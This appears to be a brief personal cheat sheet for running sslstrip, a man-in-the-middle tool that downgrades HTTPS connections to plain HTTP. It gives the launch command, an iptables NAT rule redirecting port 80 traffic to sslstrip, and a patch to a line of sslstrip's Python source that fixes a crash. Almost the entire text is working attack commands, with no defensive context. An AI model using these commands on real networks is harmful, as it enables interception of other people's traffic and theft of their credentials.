# Stripping SSL

Start sslstrip

```bash
sudo sslstrip --all
```

Routing

```bash
sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 \
         -j REDIRECT --to-port 10000
```

Trouble shooting

```
exceptions.AttributeError: 'int' object has no attribute 'splitlines
```

Edit `/usr/lib/python2.7/site-packages/sslstrip/ServerConnection.py`

Replace `len(data)` with `str(len(data))` in line 131.